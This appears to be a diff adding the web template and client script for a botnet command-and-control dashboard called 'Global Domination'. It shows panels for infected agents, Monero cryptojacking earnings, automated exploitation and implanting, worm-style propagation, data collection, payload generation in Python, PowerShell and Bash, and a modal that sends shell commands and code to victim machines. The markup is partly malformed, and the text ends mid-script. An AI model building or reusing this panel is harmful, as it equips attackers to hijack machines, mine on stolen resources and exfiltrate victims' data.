@@ -1,0 +1,1150 @@
+{% extends "base.html" %}
+{% block title %}Global Domination{% endblock %}
+{% block page_title %}Global Domination{% endblock %}
+{% block page_subtitle %}Command & Control{% endblock %}
+{% block page_icon %}
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="w-4 h-4 text-accent"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/><path d="M12 2v4M12 18v4M2 12h4M18 12h4"/></svg>
+{% endblock %}
+
+{% block head %}
+<style>
+  .dom-status-bar { display: grid; grid-template-columns: repeat(6, 1fr); gap: 12px; margin-bottom: 20px; }
+  @media (max-width: 767px) { .dom-status-bar { grid-template-columns: repeat(3, 1fr); } }
+  @media (max-width: 479px) { .dom-status-bar { grid-template-columns: repeat(2, 1fr); } }
+  
+  .dom-stat { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 16px; text-align: center; transition: all 0.2s; }
+  .dom-stat:hover { border-color: var(--accent-dim); transform: translateY(-2px); }
+  .dom-stat .value { font-size: 28px; font-weight: 700; font-family: var(--font-mono); }
+  .dom-stat .label { font-size: 11px; color: var(--text-muted); margin-top: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .dom-stat.green .value { color: var(--green); }
+  .dom-stat.yellow .value { color: var(--yellow); }
+  .dom-stat.red .value { color: var(--red); }
+  .dom-stat.blue .value { color: var(--cyan); }
+  
+  .dom-grid { display: grid; grid-template-columns: 1fr 350px; gap: 20px; }
+  @media (max-width: 991px) { .dom-grid { grid-template-columns: 1fr; } }
+  
+  .dom-btn-main {
+    padding: 16px 20px;
+    border: none;
+    border-radius: 10px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    transition: all 0.2s;
+    width: 100%;
+  }
+  .dom-btn-main:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(0,0,0,0.3); }
+  .dom-btn-main:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+  
+  .dom-btn-domination { background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%); color: #fff; }
+  .dom-btn-mining { background: linear-gradient(135deg, #ffd700 0%, #ff8c00 100%); color: #000; }
+  .dom-btn-propagate { background: linear-gradient(135deg, #00d68f 0%, #00a870 100%); color: #000; }
+  .dom-btn-collect { background: linear-gradient(135deg, #00d2ff 0%, #2196f3 100%); color: #000; }
+  .dom-btn-stop { background: linear-gradient(135deg, #444 0%, #222 100%); color: #fff; }
+  
+  .dom-btn-status { font-size: 11px; padding: 4px 10px; border-radius: 20px; background: rgba(0,0,0,0.3); }
+  
+  .dom-system-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid var(--border); }
+  .dom-system-row:last-child { border-bottom: none; }
+  .dom-system-name { display: flex; align-items: center; gap: 10px; }
+  .dom-system-indicator { width: 10px; height: 10px; border-radius: 50%; }
+  .dom-system-indicator.on { background: var(--green); box-shadow: 0 0 10px var(--green); }
+  .dom-system-indicator.off { background: #444; }
+  .dom-system-indicator.error { background: var(--red); box-shadow: 0 0 10px var(--red); }
+  
+  .dom-agent-row {
+    display: flex;
+    flex-direction: column;
+    padding: 10px 12px;
+    background: var(--bg-input);
+    margin-bottom: 6px;
+    border-radius: 8px;
+    cursor: pointer;
+    border: 1px solid transparent;
+    transition: all 0.2s;
+  }
+  .dom-agent-row:hover { background: var(--bg-hover); border-color: var(--border); }
+  .dom-agent-main { display: flex; align-items: center; gap: 10px; margin-bottom: 4px; }
+  .dom-agent-info { display: flex; gap: 15px; font-size: 10px; color: var(--text-muted); padding-left: 18px; }
+  .dom-agent-id { font-family: var(--font-mono); font-size: 12px; color: var(--cyan); }
+  .dom-agent-platform { font-size: 10px; padding: 2px 8px; background: var(--bg-tertiary); border-radius: 4px; color: var(--text-secondary); }
+  .dom-agent-badge { font-size: 10px; padding: 1px 6px; border-radius: 3px; }
+  .dom-agent-badge.mining { background: rgba(255,215,0,0.15); color: var(--yellow); }
+  .dom-agent-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+  .dom-agent-dot.online { background: var(--green); box-shadow: 0 0 6px rgba(0,214,143,0.5); }
+  .dom-agent-dot.offline { background: #444; }
+  
+  .dom-log-line { margin-bottom: 4px; display: flex; gap: 10px; padding: 3px 5px; border-radius: 3px; }
+  .dom-log-line:hover { background: var(--bg-tertiary); }
+  .dom-log-line.hidden { display: none; }
+  .dom-log-time { color: var(--text-muted); min-width: 75px; font-family: var(--font-mono); font-size: 11px; }
+  .dom-log-source { min-width: 40px; font-weight: 600; text-align: center; font-size: 10px; }
+  .dom-log-source.ws { color: #a855f7; }
+  .dom-log-source.api { color: #3b82f6; }
+  .dom-log-source.sys { color: var(--text-muted); }
+  .dom-log-type { min-width: 50px; font-weight: 600; font-size: 10px; }
+  .dom-log-type.info { color: var(--cyan); }
+  .dom-log-type.success { color: var(--green); }
+  .dom-log-type.error { color: var(--red); }
+  .dom-log-type.warn { color: var(--yellow); }
+  .dom-log-msg { color: var(--text-primary); flex: 1; word-break: break-all; font-size: 11px; }
+  
+  .dom-progress-bar { height: 4px; background: var(--border); border-radius: 2px; margin-top: 15px; overflow: hidden; }
+  .dom-progress-fill { height: 100%; background: linear-gradient(90deg, var(--green), var(--cyan)); width: 0%; transition: width 0.3s; }
+  
+  .dom-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; }
+  .dom-modal.active { display: flex; }
+  .dom-modal-content { background: var(--bg-card); padding: 25px; border-radius: 12px; max-width: 400px; width: 90%; border: 1px solid var(--border); }
+  
+  .log-filter-btn { padding: 5px 12px; border-radius: 6px; border: 1px solid var(--border); background: var(--bg-card); color: var(--text-muted); font-size: 11px; cursor: pointer; transition: all 0.2s; }
+  .log-filter-btn:hover { border-color: var(--accent); color: var(--accent); }
+  .log-filter-btn.active { background: var(--accent); color: #fff; border-color: var(--accent); }
+  
+  .card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; }
+</style>
+{% endblock %}
+
+{% block content %}
+
+<!-- Wallet Info -->
+<div class="card" style="margin-bottom:20px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
+  <div style="display:flex; align-items:center; gap:12px;">
+    <div style="width:40px; height:40px; border-radius:10px; background:linear-gradient(135deg, var(--accent) 0%, #e040fb 100%); display:flex; align-items:center; justify-content:center;">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M19 5v14H5V5h14m0-2H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2z"/><path d="M12 8v8M8 12h8"/></svg>
+    </div>
+    <div>
+      <div style="font-size:11px; color:var(--text-muted);">Mining Wallet</div>
+      <div id="wallet-display" style="font-family:var(--font-mono); font-size:12px; color:var(--green);">Loading...</div>
+    </div>
+  </div>
+  <div id="daily-estimate" style="font-family:var(--font-mono); font-size:14px; color:var(--yellow);">$0.00/day</div>
+</div>
+
+<!-- Status Bar -->
+<div class="dom-status-bar">
+  <div class="dom-stat green">
+    <div class="value" id="stat-total">0</div>
+    <div class="label">Total Agents</div>
+  </div>
+  <div class="dom-stat green">
+    <div class="value" id="stat-online">0</div>
+    <div class="label">Online</div>
+  </div>
+  <div class="dom-stat yellow">
+    <div class="value" id="stat-mining">0</div>
+    <div class="label">Mining</div>
+  </div>
+  <div class="dom-stat blue">
+    <div class="value" id="stat-data">0</div>
+    <div class="label">Data Records</div>
+  </div>
+  <div class="dom-stat yellow">
+    <div class="value" id="stat-hashrate">0</div>
+    <div class="label">Hashrate H/s</div>
+  </div>
+  <div class="dom-stat">
+    <div class="value" id="stat-daily">$0</div>
+    <div class="label">Daily Est.</div>
+  </div>
+</div>
+
+<!-- Main Grid -->
+<div class="dom-grid">
+  <!-- Left: Control -->
+  <div class="card">
+    <h2 style="font-size:14px; color:var(--text-muted); margin-bottom:15px; text-transform:uppercase; letter-spacing:1px;">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:8px; vertical-align:middle;"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
+      Global Domination Control
+    </h2>
+    
+    <!-- Main Buttons -->
+    <div style="display:grid; gap:15px; margin-bottom:20px;">
+      <button class="dom-btn-main" style="background:linear-gradient(135deg, var(--green) 0%, #00e676 100%); padding:25px; font-size:18px;" onclick="startAll()" id="btn-start-all">
+        <span>🚀 START ALL OPERATIONS</span>
+        <span class="dom-btn-status" id="start-status">READY</span>
+      </button>
+      
+      <button class="dom-btn-main dom-btn-stop" style="padding:25px; font-size:18px;" onclick="stopAll()" id="btn-stop-all">
+        <span>⏹️ STOP ALL OPERATIONS</span>
+        <span class="dom-btn-status">EMERGENCY</span>
+      </button>
+    </div>
+    
+    <!-- REAL STATISTICS -->
+    <div style="background:linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius:10px; padding:15px; margin-bottom:15px; border:1px solid var(--green);">
+      <div style="font-size:11px; color:var(--green); margin-bottom:10px; text-transform:uppercase; font-weight:bold;">📊 REAL STATISTICS (Live)</div>
+      
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>🤖 Agents Total</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text); font-size:13px; font-weight:bold;" id="real-agents">0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>🟢 Online Now</span></div>
+        <div style="font-family:var(--font-mono); color:var(--green); font-size:13px; font-weight:bold;" id="real-online">0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>⚡ Hashrate</span></div>
+        <div style="font-family:var(--font-mono); color:var(--cyan); font-size:13px; font-weight:bold;" id="real-hashrate">0 H/s</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>⛏️ Active Miners</span></div>
+        <div style="font-family:var(--font-mono); color:var(--yellow); font-size:13px;" id="real-miners">0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>📋 Tasks Done</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text); font-size:13px;" id="real-tasks">0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>📦 Data Records</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text); font-size:13px;" id="real-data">0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>💰 Est. Daily XMR</span></div>
+        <div style="font-family:var(--font-mono); color:var(--green); font-size:13px; font-weight:bold;" id="real-daily-xmr">0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>💵 Est. Monthly USD</span></div>
+        <div style="font-family:var(--font-mono); color:var(--green); font-size:13px; font-weight:bold;" id="real-monthly-usd">$0</div>
+      </div>
+    </div>
+    
+    <!-- Progress Stats -->
+    <div style="background:var(--bg-input); border-radius:10px; padding:15px; margin-bottom:15px;">
+      <div style="font-size:11px; color:var(--text-muted); margin-bottom:10px; text-transform:uppercase;">Operation Progress</div>
+      
+      <div class="dom-system-row">
+        <div class="dom-system-name"><div class="dom-system-indicator" id="ind-scan"></div><span>🔍 Scanning</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text-muted); font-size:12px;" id="val-scan">0 targets</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><div class="dom-system-indicator" id="ind-detect"></div><span>👁️ Detected</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text-muted); font-size:12px;" id="val-detect">0 systems</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><div class="dom-system-indicator" id="ind-bypass"></div><span>🔓 Bypassed</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text-muted); font-size:12px;" id="val-bypass">0 / 0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><div class="dom-system-indicator" id="ind-exploit"></div><span>💉 Exploited</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text-muted); font-size:12px;" id="val-exploit">0 systems</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><div class="dom-system-indicator" id="ind-implant"></div><span>🔧 Implanted</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text-muted); font-size:12px;" id="val-implant">0 / 0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><div class="dom-system-indicator" id="ind-verify"></div><span>✅ Verified</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text-muted); font-size:12px;" id="val-verify">0 active</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><div class="dom-system-indicator" id="ind-mining"></div><span>⛏️ Mining</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text-muted); font-size:12px;" id="val-mining">0 H/s</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><div class="dom-system-indicator" id="ind-collect"></div><span>📊 Collected</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text-muted); font-size:12px;" id="val-collect">0 records</div>
+      </div>
+    </div>
+    
+    <!-- System Status -->
+    <div style="background:var(--bg-input); border-radius:10px; padding:15px;">
+      <div style="font-size:11px; color:var(--text-muted); margin-bottom:10px; text-transform:uppercase;">System Status</div>
+      <div class="dom-system-row">
+        <div class="dom-system-name">
+          <div class="dom-system-indicator" id="ind-server"></div>
+          <span>C2 Server</span>
+        </div>
+        <div style="font-family:var(--font-mono); color:var(--text-muted); font-size:12px;" id="val-server">Checking...</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name">
+          <div class="dom-system-indicator" id="ind-database"></div>
+          <span>Database</span>
+        </div>
+        <div style="font-family:var(--font-mono); color:var(--text-muted); font-size:12px;" id="val-database">Checking...</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name">
+          <div class="dom-system-indicator" id="ind-websocket"></div>
+          <span>WebSocket</span>
+        </div>
+        <div style="font-family:var(--font-mono); color:var(--text-muted); font-size:12px;" id="val-websocket">Disconnected</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><div class="dom-system-indicator" id="ind-mining-sys"></div>
+        
+    <!-- EXPLOITATION PANEL -->
+    <div style="background:linear-gradient(135deg, #1a0a0a 0%, #2a1010 100%); border-radius:10px; padding:15px; margin-bottom:15px; border:1px solid #ff4444;">
+      <div style="font-size:11px; color:#ff4444; margin-bottom:10px; text-transform:uppercase; font-weight:bold;">💥 EXPLOITATION ENGINE</div>
+      
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>🎯 Targets Scanned</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text); font-size:13px;" id="exploit-scanned">0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>🔓 Vulnerable</span></div>
+        <div style="font-family:var(--font-mono); color:#ffaa00; font-size:13px;" id="exploit-vulnerable">0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="div-system-name"><span>✅ Exploited</span></div>
+        <div style="font-family:var(--font-mono); color:#00ff00; font-size:13px;" id="exploited-count">0</div>
+      </div>
+      
+      <div style="margin-top:10px;">
+        <button style="background:#ff4444; border:none; padding:8px 15px; border-radius:5px; color:white; cursor:pointer; font-size:11px;" onclick="startExploitation()">
+          🚀 START AUTO-EXPLOIT
+        </button>
+      </div>
+    </div>
+    
+    <!-- PAYLOADS PANEL -->
+    <div style="background:linear-gradient(135deg, #0a1a1a 0%, #102a2a 100%); border-radius:10px; padding:15px; margin-bottom:15px; border:1px solid #00aaaa;">
+      <div style="font-size:11px; color:#00aaaa; margin-bottom:10px; text-transform:uppercase; font-weight:bold;">📦 PAYLOADS</div>
+      
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
+        <button style="background:#1a1a2e; border:1px solid #00aaaa; padding:10px; border-radius:5px; color:#00aaaa; cursor:pointer; font-size:11px;" onclick="generatePayload('python')">
+          🐍 Python
+        </button>
+        <button style="background:#1a1a2e; border:1px solid #00aaaa; padding:10px; border-radius:5px; color:#00aaaa; cursor:pointer; font-size:11px;" onclick="generatePayload('powershell')">
+          💠 PowerShell
+        </button>
+        <button style="background:#1a1a2e; border:1px solid #00aaaa; padding:10px; border-radius:5px; color:#00aaaa; cursor:pointer; font-size:11px;" onclick="generatePayload('bash')">
+          🐚 Bash
+        </button>
+        <button style="background:#1a1a2e; border:1px solid #00aaaa; padding:10px; border-radius:5px; color:#00aaaa; cursor:pointer; font-size:11px;" onclick="showPayloads()">
+          📋 List All
+        </button>
+      </div>
+    </div>
+    
+    <!-- PROPAGATION PANEL -->
+    <div style="background:linear-gradient(135deg, #1a1a0a 0%, #2a2a10 100%); border-radius:10px; padding:15px; margin-bottom:15px; border:1px solid #aaaa00;">
+      <div style="font-size:11px; color:#aaaa00; margin-bottom:10px; text-transform:uppercase; font-weight:bold;">🦠 PROPAGATION</div>
+      
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>📤 Attempts</span></div>
+        <div style="font-family:var(--font-mono); color:var(--text); font-size:13px;" id="prop-attempts">0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>✅ Successful</span></div>
+        <div style="font-family:var(--font-mono); color:#00ff00; font-size:13px;" id="prop-success">0</div>
+      </div>
+      <div class="dom-system-row">
+        <div class="dom-system-name"><span>🆕 New Agents (24h)</span></div>
+        <div style="font-family:var(--font-mono); color:#00ff00; font-size:13px;" id="prop-new-agents">0</div>
+      </div>
+      
+      <div style="margin-top:10px;">
+        <button style="background:#aaaa00; border:none; padding:8px 15px; border-radius:5px; color:black; cursor:pointer; font-size:11px; font-weight:bold;" onclick="startPropagation()">
+          🦠 PROPAGATE ALL
+        </button>
+      </div>
+    </div>
+    
+    <!-- DEMO DATA -->
+    <div style="background:linear-gradient(135deg, #1a1a2a 0%, #2a2a3a 100%); border-radius:10px; padding:15px; margin-bottom:15px; border:1px solid #666;">
+      <div style="font-size:11px; color:#aaa; margin-bottom:10px; text-transform:uppercase; font-weight:bold;">🧪 DEMO / TESTING</div>
+      <button style="background:#444; border:1px solid #666; padding:8px 15px; border-radius:5px; color:#fff; cursor:pointer; font-size:11px; width:100%;" onclick="seedDemoData()">
+        📊 Seed Demo Data
+      </button>
+    </div>
+    
+    <!-- CVE DATABASE -->
+    <div style="background:var(--bg-input); border-radius:10px; padding:15px;">
+      <div style="font-size:11px; color:var(--text-muted); margin-bottom:10px; text-transform:uppercase;">CVE Database</div>
+      <div id="cve-list" style="max-height:150px; overflow-y:auto; font-size:11px;">
+        <div style="color:var(--text-muted);">Loading CVEs...</div>
+      </div>
+    </div>
+    
+    <div class="dom-progress-bar"><div class="dom-progress-fill" id="progress"></div></div>
+  </div>
+  
+  <!-- Right: Agents -->
+  <div class="card">
+    <h2 style="font-size:14px; color:var(--text-muted); margin-bottom:15px; text-transform:uppercase; letter-spacing:1px;">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:8px; vertical-align:middle;"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
+      Agents (<span id="agents-count">0</span>)
+    </h2>
+    <div id="agents-list" style="max-height:400px; overflow-y:auto;">
+      <div style="text-align:center; color:var(--text-muted); padding:20px;">Loading...</div>
+    </div>
+  </div>
+</div>
+
+<!-- Debug Panel -->
+<div class="card" style="margin-top:20px;">
+  <h2 style="font-size:14px; color:var(--text-muted); margin-bottom:15px; text-transform:uppercase; letter-spacing:1px; display:flex; justify-content:space-between; align-items:center;">
+    <span>
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:8px; vertical-align:middle;"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
+      System Log
+    </span>
+    <div>
+      <button onclick="exportLog()" style="padding:5px 12px; border-radius:6px; border:1px solid var(--border); background:var(--bg-card); color:var(--text-muted); font-size:11px; cursor:pointer; margin-right:5px;">📥 Export</button>
+      <button onclick="clearLog()" style="padding:5px 12px; border-radius:6px; border:1px solid var(--border); background:var(--bg-card); color:var(--text-muted); font-size:11px; cursor:pointer;">🗑️ Clear</button>
+    </div>
+  </h2>
+  
+  <!-- Log Controls -->
+  <div style="display:flex; gap:10px; margin-bottom:15px; flex-wrap:wrap; align-items:center;">
+    <div style="display:flex; gap:5px;">
+      <button class="log-filter-btn active" data-type="all" onclick="filterLog('all')">ALL</button>
+      <button class="log-filter-btn" data-type="info" onclick="filterLog('info')">INFO</button>
+      <button class="log-filter-btn" data-type="success" onclick="filterLog('success')">SUCCESS</button>
+      <button class="log-filter-btn" data-type="error" onclick="filterLog('error')">ERROR</button>
+      <button class="log-filter-btn" data-type="warn" onclick="filterLog('warn')">WARN</button>
+      <button class="log-filter-btn" data-type="ws" onclick="filterLog('ws')">WS</button>
+      <button class="log-filter-btn" data-type="api" onclick="filterLog('api')">API</button>
+    </div>
+    <div style="margin-left:auto; display:flex; gap:15px; font-size:11px; color:var(--text-muted);">
+      <div style="display:flex; align-items:center; gap:5px;"><div style="width:8px; height:8px; border-radius:50%; background:var(--cyan);"></div><span id="log-info">0</span></div>
+      <div style="display:flex; align-items:center; gap:5px;"><div style="width:8px; height:8px; border-radius:50%; background:var(--green);"></div><span id="log-success">0</span></div>
+      <div style="display:flex; align-items:center; gap:5px;"><div style="width:8px; height:8px; border-radius:50%; background:var(--red);"></div><span id="log-error">0</span></div>
+      <div style="display:flex; align-items:center; gap:5px;"><div style="width:8px; height:8px; border-radius:50%; background:var(--yellow);"></div><span id="log-warn">0</span></div>
+    </div>
+  </div>
+  
+  <div id="debug-log" style="background:var(--bg-input); border-radius:8px; padding:15px; height:300px; overflow-y:auto; font-family:var(--font-mono); font-size:11px;">
+    <div class="dom-log-line"><span class="dom-log-time">--:--:--</span><span class="dom-log-source sys">SYS</span><span class="dom-log-type info">INIT</span><span class="dom-log-msg">Dashboard initializing...</span></div>
+  </div>
+</div>
+
+<!-- Modal -->
+<div class="dom-modal" id="modal">
+  <div class="dom-modal-content">
+    <h3 id="modal-title" style="margin-bottom:20px; font-size:16px;">Command</h3>
+    <select id="modal-select" style="width:100%; padding:12px; margin-bottom:10px; background:var(--bg-input); border:1px solid var(--border); border-radius:8px; color:var(--text-primary); font-size:14px;">
+      <option value="cmd">Shell Command</option>
+      <option value="exec">Python Code</option>
+      <option value="download">Download File</option>
+      <option value="collect">Collect Data</option>
+      <option value="mining_start">Start Mining</option>
+      <option value="mining_stop">Stop Mining</option>
+      <option value="propagate">Propagate</option>
+    </select>
+    <input type="text" id="modal-input" placeholder="Enter payload..." style="width:100%; padding:12px; margin-bottom:10px; background:var(--bg-input); border:1px solid var(--border); border-radius:8px; color:var(--text-primary); font-size:14px;">
+    <div style="display:flex; gap:10px; margin-top:15px;">
+      <button onclick="closeModal()" style="flex:1; padding:12px; border:none; border-radius:8px; cursor:pointer; font-weight:600; background:var(--bg-tertiary); color:var(--text-primary);">Cancel</button>
+      <button onclick="executeModal()" style="flex:1; padding:12px; border:none; border-radius:8px; cursor:pointer; font-weight:600; background:var(--green); color:#000;">Execute</button>
+    </div>
+  </div>
+</div>
+
+{% endblock %}
+
+{% block scripts %}
+<script>
+// Domination Panel - use global socket from socket.js
+const API = window.location.origin;
+let agents = [];
+let miningActive = false;
+let dominationActive = false;
+let lastHashrate = 0;
+let totalDataCollected = 0;
+
+// Initialize
+document.addEventListener('DOMContentLoaded', () => {
+  log('info', 'Dashboard initializing...', 'sys');
+  initDomSocket();
+  loadAll();
+  setInterval(loadAll, 30000);
+  setInterval(updateMiningStatus, 10000);
+});
+
+// Socket.IO - use existing global socket or create new
+function initDomSocket() {
+  log('info', 'Initializing WebSocket connection...', 'sys');
+  
+  // Use global socket from socket.js if available
+  if (typeof socket !== 'undefined' && socket) {
+    log('success', 'Using global WebSocket connection', 'ws');
+  } else {
+    log('warn', 'Creating new WebSocket connection', 'ws');
+    window.socket = io(API, { transports: ['websocket', 'polling'] });
+  }
+  
+  socket.on('connect', () => {
+    setSystemStatus('websocket', true, 'Connected');
+    log('success', 'WebSocket connected', 'ws');
+  });
+  
+  socket.on('disconnect', (reason) => {
+    setSystemStatus('websocket', false, 'Disconnected');
+    log('error', `WebSocket disconnected: ${reason}`, 'ws');
+  });
+  
+  socket.on('connect_error', (err) => {
+    log('error', `WebSocket error: ${err.message}`, 'ws');
+  });
+  
+  socket.on('agent_registered', (data) => {
+    log('success', `New agent: ${data.agent_id?.substring(0,8)}... (${data.platform || 'unknown'})`, 'ws');
+    loadAll();
+  });
+  
+  socket.on('task_result', (data) => {
+    log('info', `Task ${data.task_type} completed by ${data.agent_id?.substring(0,8)}...`, 'ws');
+  });
+  
+  socket.on('mining_stats', (data) => {
+    lastHashrate = data.hashrate || lastHashrate;
+    document.getElementById('stat-hashrate').textContent = formatHashrate(lastHashrate);
+    document.getElementById('stat-mining').textContent = data.agents_count || 0;
+    updateProgress('mining', `${formatHashrate(lastHashrate)}`, data.agents_count > 0);
+    if (data.agents_count > 0) setSystemStatus('mining-sys', true, `${data.agents_count} active`);
+  });
+  
+  socket.on('agent_offline', (data) => {
+    log('warn', `Agent offline: ${data.agent_id?.substring(0,8)}...`, 'ws');
+    loadAll();
+  });
+  
+  socket.on('data_collected', (data) => {
+    totalDataCollected += data.records || 0;
+    document.getElementById('stat-data').textContent = totalDataCollected;
+    updateProgress('collect', `${totalDataCollected} records`, true);
+    log('success', `📊 Collected ${data.records || 0} records from ${data.agent_id?.substring(0,8) || 'system'}...`, 'ws');
+  });
+  
+  socket.on('propagation_result', (data) => {
+    log('info', `🦠 Propagation: ${data.success || 0} success, ${data.failed || 0} failed`, 'ws');
+  });
+  
+  socket.on('global_domination', (data) => {
+    log('success', `🚀 DOMINATION activated on ${data.agents_targeted || 0} agents!`, 'ws');
+    dominationActive = true;
+    miningActive = data.mining_active || true;
+    const btn = document.getElementById('btn-start-all');
+    const status = document.getElementById('start-status');
+    status.textContent = 'ACTIVE';
+  });
+  
+  // Detailed operation events
+  socket.on('scan_progress', (data) => {
+    updateProgress('scan', `${data.found || 0} targets`, data.active);
+    if (data.found) log('info', `🔍 Scan found ${data.found} targets in ${data.network || 'network'}`, 'ws');
+  });
+  
+  socket.on('detect_progress', (data) => {
+    updateProgress('detect', `${data.count || 0} systems`, data.active);
+    if (data.vulnerable) log('warn', `👁️ Detected ${data.vulnerable} vulnerable systems`, 'ws');
+  });
+  
+  socket.on('bypass_progress', (data) => {
+    updateProgress('bypass', `${data.success || 0} / ${data.total || 0}`, data.active);
+    if (data.method) log('success', `🔓 Bypass via ${data.method}: ${data.success}/${data.total}`, 'ws');
+  });
+  
+  socket.on('exploit_progress', (data) => {
+    updateProgress('exploit', `${data.exploited || 0} systems`, data.active);
+    if (data.cve) log('success', `💉 Exploited ${data.exploited} via ${data.cve}`, 'ws');
+  });
+  
+  socket.on('implant_progress', (data) => {
+    updateProgress('implant', `${data.deployed || 0} / ${data.total || 0}`, data.active);
+    if (data.deployed) log('success', `🔧 Implanted ${data.deployed} agents successfully`, 'ws');
+  });
+  
+  socket.on('verify_progress', (data) => {
+    updateProgress('verify', `${data.active || 0} active`, data.active > 0);
+    if (data.active) log('success', `✅ Verified ${data.active} active implants`, 'ws');
+  });
+  
+  socket.on('operation_log', (data) => {
+    log(data.level || 'info', data.message, data.source || 'sys');
+  });
+  
+  socket.on('system_alert', (data) => {
+    log(data.level || 'warn', data.message || 'System alert', 'sys');
+  });
+  
+  socket.on('mining_started', (data) => {
+    log('success', `Mining started on ${data.agents_targeted || 0} agents`, 'ws');
+    miningActive = true;
+    setButtonStatus('mining', 'ON');
+    setSystemStatus('mining-sys', true, `${data.agents_targeted || 0} active`);
+  });
+  
+  socket.on('mining_stopped', (data) => {
+    log('warn', `Mining stopped on ${data.agents_targeted || 'all'} agents`, 'ws');
+    miningActive = false;
+    setButtonStatus('mining', 'OFF');
+    setSystemStatus('mining-sys', false, 'Idle');
+  });
+  
+  // Exploitation events
+  socket.on('exploitation_report', (data) => {
+    log('success', `💥 Exploitation: ${data.exploited || 0}/${data.targets_scanned || 0} systems`, 'exploitation');
+    document.getElementById('exploit-scanned').textContent = data.targets_scanned || 0;
+    document.getElementById('exploit-vulnerable').textContent = data.vulnerable_found || 0;
+    document.getElementById('exploited-count').textContent = data.exploited || 0;
+  });
+  
+  socket.on('payload_generated', (data) => {
+    log('success', `📦 Payload: ${data.type}`, 'payloads');
+  });
+}
+
+// Load All Data
+async function loadAll() {
+  log('info', 'Loading system data...', 'sys');
+  
+  try {
+    const health = await fetch(`${API}/api/health`).then(r => r.json());
+    setSystemStatus('server', true, 'Running');
+    setSystemStatus('database', health.database === 'ok', health.database === 'ok' ? 'Connected' : 'Error');
+    log('success', `Server: ${health.status} | DB: ${health.database}`, 'api');
+  } catch (e) {
+    log('error', `Health check failed: ${e.message}`, 'api');
+  }
+  
+  try {
+    const status = await fetch(`${API}/api/domination/status`).then(r => r.json());
+    document.getElementById('stat-total').textContent = status.total_agents || 0;
+    document.getElementById('stat-online').textContent = status.online_agents || 0;
+    document.getElementById('stat-mining').textContent = status.mining_active || 0;
+    document.getElementById('stat-data').textContent = status.data_collected || 0;
+    document.getElementById('agents-count').textContent = status.total_agents || 0;
+  } catch (e) {
+    log('error', `Status load failed: ${e.message}`, 'api');
+  }
+  
+  try {
+    const wallet = await fetch(`${API}/api/domination/wallet`).then(r => r.json());
+    document.getElementById('wallet-display').innerHTML = `XMR: ${wallet.xmr?.substring(0,15)}... | Pool: ${wallet.pool}`;
